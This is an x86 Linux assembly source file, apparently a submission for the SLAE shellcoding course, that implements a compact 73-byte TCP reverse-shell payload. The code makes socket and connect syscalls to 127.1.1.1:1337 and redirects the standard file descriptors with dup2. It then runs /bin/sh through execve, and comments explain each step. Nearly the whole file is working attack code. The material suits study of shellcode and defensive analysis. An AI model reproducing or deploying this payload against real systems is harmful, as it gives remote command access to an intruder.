; SLAE - Assignment #2 Reverse Shell TCP
; Author: John Stigerwalt
; Website: https://slae.whiteknightlabs.com
; 73 Bytes

global _start

section .text
_start:
; Socket:
;
; int socket(int domain, int type, int protocol);
;
;
push byte 0x66	; syscall: sys_socketcall
pop eax		; clean out eax and assign value

push 0x1		; sys_socket (0x1)
pop ebx

cdq			; put 0 into edx using signed bit from eax

push edx		; push 0 (first arg)
push ebx		; push 1 (second arg)
push byte 0x2	; push 2 (third arg)

mov ecx, esp	; save stack pointer

int 0x80		; exec sys_socketcall


; Connect:
;
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
; struct sockaddr_in {
; __kernel_sa_family_t	sin_family;	/* Address Family */
; __be16				sin_port;		/* Port Number */
; struct in_addr			sin_addr;		/* Internet Address */
;};


xchg edx, eax		; save return sockfd

pop ebx			; ebx now equals 2

mov al, 0x66		; syscall: sys_socketcall
 
push 0x0101017f	; IP 127.1.1.1 - No Nulls
push word 0x3905	; port 1337
push bx			; AF_INET = 2 
mov ecx, esp		; save stack point to struct sockaddr (bracket arguments)

push 0x10			; addrlen = 16 (0x10)
push ecx			; pointer to sockaddr
push edx			; sockfd
mov ecx, esp		; save stack pointer to all arguments

inc ebx			; ebx now equals 3 (sys_connect) (0x3) 

int 0x80			; exec sys_socketcall


; DUP2
;
; int dup2(int oldfd, int newfd);
;
;

;xor ecx, ecx		; zero out ecx
;mov cl, 0x2		;initiate counter for loop
push byte 0x2		; using push/pop to save 2 bytes
pop ecx			; pop 0x2 to ecx. Saved 2 bytes doing this.

xchg ebx, edx		; move sockfd to ebx

dloop:
mov al, 0x3f		; sys_dup2 syscall 63
int 0x80
dec ecx			; decrement ecx to countine loop counter
jns dloop			

; Execve
;
; int execve(const char *fileanme, char *const argv[],char *const envp[]);
;
;

cdq				; Uses only 2 bytes.

push edx	; null terminator

push 0x68732f2f	;"hs//"
push 0x6e69622f	;"nib/"

mov ebx, esp
xor ecx, ecx		; ecx = null

mov al, 0x0b		; sys_execve

int 0x80



